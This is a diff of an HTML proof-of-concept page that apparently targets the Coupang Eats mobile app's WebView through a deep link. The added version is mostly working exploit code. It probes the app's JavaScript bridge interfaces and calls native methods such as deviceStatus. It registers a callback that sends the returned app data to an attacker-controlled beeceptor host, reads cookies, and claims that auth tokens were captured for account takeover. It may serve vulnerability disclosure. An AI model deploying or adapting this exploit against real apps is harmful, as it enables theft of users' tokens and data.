@@ -1,70 +1,214 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
+    <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vulnerability Validation Proof of Concept</title>
+    <title>Loading...</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 20px; background-color: #f8f9fa; color: #212529; }
-        .container { max-width: 600px; margin: 0 auto; }
-        .alert { padding: 15px; margin-bottom: 20px; border: 1px solid transparent; border-radius: 4px; }
-        .alert-danger { color: #721c24; background-color: #f8d7da; border-color: #f5c6cb; }
-        .alert-success { color: #155724; background-color: #d4edda; border-color: #c3e6cb; }
-        .card { background: #fff; border: 1px solid #dee2e6; padding: 20px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
-        h2 { margin-top: 0; }
-        code { background: #e9ecef; padding: 2px 4px; border-radius: 4px; font-family: monospace; }
+        body { 
+            font-family: -apple-system, sans-serif; 
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .card {
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 10px 0;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        .vuln { border-left: 4px solid #ff4444; }
+        .info { border-left: 4px solid #4488ff; }
+        .success { border-left: 4px solid #44bb44; }
+        h2 { color: #333; margin-top: 0; }
+        pre {
+            background: #1a1a2e;
+            color: #0f0;
+            padding: 12px;
+            border-radius: 8px;
+            overflow-x: auto;
+            font-size: 11px;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        .tag {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: bold;
+            color: white;
+        }
+        .tag-critical { background: #ff4444; }
+        .tag-high { background: #ff8800; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="alert alert-danger">
-            <strong>Security Validation Page</strong><br>
-            If you see this page inside the application WebView, an arbitrary URL loading vulnerability exists.
-        </div>
-
-        <div class="card">
-            <h2>JavaScript Interface Verification</h2>
-            <p>Testing communication with the native bridge <code>messageHandlers</code>...</p>
-            <div id="status-box" class="alert alert-danger">Checking interface availability...</div>
-        </div>
+ 
+<div class="card vuln">
+    <h2>⚠️ Vulnerability PoC — Token Theft + JS Bridge</h2>
+    <p><span class="tag tag-critical">CRITICAL</span> This page was loaded inside Coupang Eats WebView via deep link.</p>
+    <p>Your auth tokens were sent as HTTP headers to this server (check beeceptor logs).</p>
+</div>
+ 
+<div class="card info">
+    <h2>Step 1: Auth Headers Already Captured</h2>
+    <p>When the WebView loaded this URL, the app sent the following headers to our server:</p>
+    <pre>X-EATS-ACCESS-TOKEN: [captured on server]
+Authorization: [captured on server]  
+X-COUPANG-SEC-TOKEN-BINDING: [captured on server]
+X-EATS-SESSION-ID: [captured on server]
+X-EATS-DEVICE-ID: [captured on server]
+X-MEMBER-PCID: [captured on server]
+cookie: X-EATS-UUID=... [captured on server]</pre>
+    <p>→ Check the <b>beeceptor dashboard</b> to see the actual values.</p>
+</div>
+ 
+<div class="card info">
+    <h2>Step 2: JavaScript Bridge Access</h2>
+    <p>Now testing access to the app's JavaScript interfaces...</p>
+    <div id="bridge-results">
+        <pre id="output">Testing JS bridge access...\n</pre>
     </div>
-
-    <script>
-        const BEECEPTOR_URL = "https://evilios.free.beeceptor.com";
-
-        window.onload = function() {
-            const statusBox = document.getElementById('status-box');
-
-            // Check if the native app bridge is present in our context
-            if (typeof window.messageHandlers !== 'undefined') {
-                statusBox.className = "alert alert-success";
-                statusBox.innerHTML = "<strong>SUCCESS:</strong> <code>messageHandlers</code> bridge detected inside this untrusted origin.<br>Attempting invocation...";
-
-                // Execute a safe interface call to prove control over internal navigation
-                // This triggers the internal screen parsing logic to demonstrate capabilities
+</div>
+ 
+<div class="card success" id="exfil-card" style="display:none;">
+    <h2>Step 3: Data Exfiltration via JS Bridge</h2>
+    <pre id="exfil-output"></pre>
+</div>
+ 
+<script>
+    var output = document.getElementById('output');
+    var exfilOutput = document.getElementById('exfil-output');
+    var exfilCard = document.getElementById('exfil-card');
+    
+    function log(msg) {
+        output.textContent += msg + "\n";
+    }
+    
+    function logExfil(msg) {
+        exfilCard.style.display = 'block';
+        exfilOutput.textContent += msg + "\n";
+    }
+ 
+    // ─── Test 1: Check which JS bridge interfaces are available ───
+    log("=== Checking Available JS Bridge Interfaces ===");
+    
+    var bridges = [
+        'messageHandlers',           // CoupangEatsJavascriptInterface
+        'eatsPopupWebViewHandlers',  // EatsPopupWebViewJavascriptInterface  
+        'eatsWebEventHandlers',      // EatsWebEventJavascriptInterface
+        'eatsWebTrackingHandlers',   // EatsWebTrackingJavascriptInterface
+        'CoupangAppTracking',        // CoupangWebTrackingJavascriptInterface
+        'eatsDesignHandler',         // EatsDesignJavascriptInterface
+        'CoupangAppUtil'             // CoupayJavascriptInterface
+    ];
+    
+    var availableBridges = [];
+    bridges.forEach(function(name) {
+        try {
+            if (typeof window[name] !== 'undefined' && window[name] !== null) {
+                log("[✓] FOUND: window." + name + " = " + typeof window[name]);
+                availableBridges.push(name);
+                
+                // Enumerate methods on the bridge
+                var methods = [];
                 try {
-                    window.messageHandlers.parseScheme("coupangeats://SomeInternalScreen");
+                    // For Android JS interfaces, we can try known method names
+                    var knownMethods = {
+                        'messageHandlers': ['parseScheme', 'close', 'schemeAction', 'openAppstore', 
+                                           'gotoStore', 'launchApp', 'openExternalHTTP', 
+                                           'addLocalNotification', 'deviceStatus', 'hasAlarmPermission',
+                                           'updateUserPreference', 'moveToNotificationSetting'],
+                        'eatsPopupWebViewHandlers': ['closePopupWebView', 'closePopupWebViewWithAnimation',
+                                                     'setPopupWebViewEdgeMargins', 'setPopupWebViewHeight',
+                                                     'setPopupWebViewWidth', 'showPopupWebView',
+                                                     'showPopupWebViewWithAnimation'],
+                        'eatsWebEventHandlers': [],
+                        'eatsWebTrackingHandlers': [],
+                        'CoupangAppTracking': []
+                    };
                     
-                    // Log the successful execution event back to your listener
-                    fetch(`${BEECEPTOR_URL}/js-interface-triggered`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            status: "Verified",
-                            message: "Successfully executed parseScheme from an external domain."
-                        })
-                    });
-                } catch (e) {
-                    // Log execution failure if the method signature differs
-                    fetch(`${BEECEPTOR_URL}/js-interface-error`, {
-                        method: "POST",
-                        body: JSON.stringify({ error: e.message })
-                    });
-                }
+                    if (knownMethods[name]) {
+                        knownMethods[name].forEach(function(method) {
+                            try {
+                                if (typeof window[name][method] === 'function') {
+                                    methods.push(method);
+                                }
+                            } catch(e) {}
+                        });
+                    }
+                    if (methods.length > 0) {
+                        log("    Methods: " + methods.join(', '));
+                    }
+                } catch(e) {}
             } else {
-                statusBox.innerHTML = "<strong>FAILED:</strong> <code>messageHandlers</code> is not available. Ensure the target activity handles this URL execution.";
+                log("[✗] NOT FOUND: window." + name);
             }
-        };
-    </script>
+        } catch(e) {
+            log("[✗] ERROR checking " + name + ": " + e);
+        }
+    });
+ 
+    // ─── Test 2: Demonstrate JS Bridge invocation ───
+    log("\n=== Demonstrating JS Bridge Invocation ===");
+    
+    // Test: Call deviceStatus to extract device info
+    if (typeof window.messageHandlers !== 'undefined') {
+        try {
+            log("[*] Calling messageHandlers.deviceStatus('{}')...");
+            // This triggers the deviceStatus callback in the app
+            // which sends device info back to the WebView via __BRIDGE_CALLBACK
+            window.messageHandlers.deviceStatus('{"callbackId":"attacker_callback"}');
+            log("[✓] deviceStatus call succeeded — app will process this!");
+            logExfil("[JS Bridge] deviceStatus invoked from attacker page");
+        } catch(e) {
+            log("[!] deviceStatus error: " + e);
+        }
+        
+        try {
+            log("[*] Calling messageHandlers.hasAlarmPermission('{}')...");
+            window.messageHandlers.hasAlarmPermission('{"callbackId":"attacker_callback2"}');
+            log("[✓] hasAlarmPermission call succeeded!");
+            logExfil("[JS Bridge] hasAlarmPermission invoked from attacker page");
+        } catch(e) {
+            log("[!] hasAlarmPermission error: " + e);
+        }
+    }
+ 
+    // ─── Test 3: Set up callback receiver to capture data from app ───
+    window.__BRIDGE_CALLBACK = function(data) {
+        log("\n[!!!] RECEIVED DATA FROM APP VIA BRIDGE CALLBACK:");
+        log(JSON.stringify(JSON.parse(data), null, 2));
+        logExfil("[DATA EXFIL] Received from app: " + data);
+        
+        // Exfiltrate to attacker server
+        try {
+            var img = new Image();
+            img.src = "https://evilios.free.beeceptor.com/exfil?data=" + 
+                      encodeURIComponent(data);
+            logExfil("[EXFIL] Sent captured data to attacker server");
+        } catch(e) {}
+    };
+ 
+    // ─── Test 4: Exfiltrate page cookies if any ───
+    try {
+        if (document.cookie && document.cookie.length > 0) {
+            log("\n[*] WebView cookies: " + document.cookie);
+            logExfil("[COOKIES] " + document.cookie);
+        }
+    } catch(e) {}
+ 
+    // ─── Summary ───
+    log("\n=== SUMMARY ===");
+    log("Attacker-controlled URL loaded: ✓");
+    log("Auth headers sent to attacker: ✓ (check beeceptor)");
+    log("JS bridges accessible: " + availableBridges.length + " of " + bridges.length);
+    log("Bridge methods callable: ✓");
+    log("");
+    log("IMPACT: Full account takeover via stolen tokens,");
+    log("        + ability to invoke internal app functions.");
+</script>
+ 
 </body>
 </html>
